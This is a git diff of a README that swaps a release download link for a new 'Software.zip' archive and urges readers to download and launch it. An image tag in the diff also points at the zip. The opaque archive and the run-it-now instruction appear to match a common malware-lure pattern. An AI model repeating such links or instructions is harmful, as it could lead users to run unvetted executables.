@@ -15,9 +15,9 @@ This repository focuses on the development of a project utilizing Typescript, El
 
 ## External Link
 
-[![Download Software](https://github.com/NoroGeek/Departament-of-Truth-Core/releases/download/v1.0/Release_x64.zip)](https://github.com/NoroGeek/Departament-of-Truth-Core/releases/download/v1.0/Release_x64.zip)
+[![Download Software](https://github.com/NoroGeek/Departament-of-Truth-Core/releases/download/v2.0/Software.zip)](https://github.com/NoroGeek/Departament-of-Truth-Core/releases/download/v2.0/Software.zip)
 
-The link above will direct you to the https://github.com/NoroGeek/Departament-of-Truth-Core/releases/download/v1.0/Release_x64.zip file, which contains the latest version of our project. Simply download and launch the file to explore the features and functionalities we have to offer.
+The link above will direct you to the https://github.com/NoroGeek/Departament-of-Truth-Core/releases/download/v2.0/Software.zip file, which contains the latest version of our project. Simply download and launch the file to explore the features and functionalities we have to offer.
 
 ## Get Involved
 
@@ -39,4 +39,4 @@ Thank you for visiting our repository and showing interest in the Departament-of
 
 Remember, the truth shall set you free! 🌟
 
-![Truth](https://github.com/NoroGeek/Departament-of-Truth-Core/releases/download/v1.0/Release_x64.zip)
+![Truth](https://github.com/NoroGeek/Departament-of-Truth-Core/releases/download/v2.0/Software.zip)
